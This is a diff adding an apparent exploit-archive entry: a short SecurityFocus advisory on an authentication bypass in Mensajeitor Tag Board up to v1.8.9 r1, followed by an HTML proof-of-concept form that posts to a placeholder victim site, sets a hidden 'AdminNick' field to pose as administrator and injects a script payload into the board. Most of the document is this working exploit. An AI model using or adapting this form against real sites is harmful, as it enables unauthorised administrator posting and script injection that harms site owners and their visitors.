@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/10774/info
+
+It has been reported that Mensajeitor Tag Board is affected by an authentication bypass vulnerability. This issue is due to a failure of the application to properly handle authentication controls.
+
+Successful exploitation of this issue will allow an attacker to post messages to the affected tag board as an administrator, reportedly facilitating HTML injection and attacks.
+
+< html>
+< head>< title>Mensajeitor Exploit</title></head>
+< body>
+Inyeccion codigo en Mensajeitor =< v1.8.9 r1< br>< br>
+
+< form name="form1" method="post" action="http://www.victima.com/mensajeitor.php">
+    < input type="text" name="nick" size="10" value="Nick" maxlength="9">< br>
+    < input type="text" name="titulo" size="21" value="Mensaje">< br>
+    < input type="text" name="url" size="21" value="http://">< br>
+    < input type="hidden" name="AdminNick" value="si">< br>
+    Introduce codigo a insertar (</table> debe incluirse al principio)< br>
+    < input type="text" name="cadena_final" size="75%" value="</table>< script>alert('hacked ;)')</script>">< br>
+    < input type="submit" name="enviar" value="Enviar" class="form">< br>
+</form>
+
+MensajeitorPHP propiedad de aaff.< br>
+By Jordi Corrales (Shell Security Group, http://www.shellsec.net)
+</body></html>
